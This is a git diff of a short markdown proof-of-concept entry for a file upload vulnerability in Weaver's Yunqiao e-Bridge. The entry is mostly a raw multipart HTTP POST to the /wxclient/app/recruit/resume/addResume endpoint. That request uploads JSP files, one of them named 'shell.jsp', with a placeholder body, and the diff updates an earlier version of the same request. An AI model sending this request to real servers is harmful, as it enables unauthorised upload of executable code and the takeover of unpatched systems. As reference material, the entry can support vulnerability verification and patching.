@@ -11,28 +11,37 @@ app="泛微-云桥e-Bridge"
 ## poc
 
 ```java
-POST /wxclient/app/recruit/resume/addResume?fileElementld=111 HTTP/1.1
-Host: 
+POST /wxclient/app/recruit/resume/addResume?fileElementId=H HTTP/1.1
+Host: 127.0.0.1:8088
+Content-Length: 361
 Cache-Control: max-age=0
+sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: EBRIDGE_JSESSIONID=6E01926E757A8B0BE87DAA2EACC80EF6
-Connection: keep-alive
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDOVhr5SwLI1wpry7
-Content-Length: 264
+Connection: close
 
-------WebKitFormBoundaryDOVhr5SwLI1wpry7
-Content-Disposition: form-data; name="file";filename="1.jsp"
+------WebKitFormBoundaryD5Mawpg068t7pbxZ
+Content-Disposition: form-data; name="file"; filename="1.jsp"
+Content-Type: application/octet-stream
 
-1
-------WebKitFormBoundaryDOVhr5SwLI1wpry7--
-Content-Disposition: form-data; name="file";filename="2.jsp"
+127
+------WebKitFormBoundaryD5Mawpg068t7pbxZ
+Content-Disposition: form-data; name="file"; filename="shell.jsp"
+Content-Type: application/octet-stream
 
-1
-------WebKitFormBoundaryDOVhr5SwLI1wpry7--
+127
+------WebKitFormBoundaryD5Mawpg068t7pbxZ--
 ```
 
 ![image-20240806141107108](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408061411331.png)
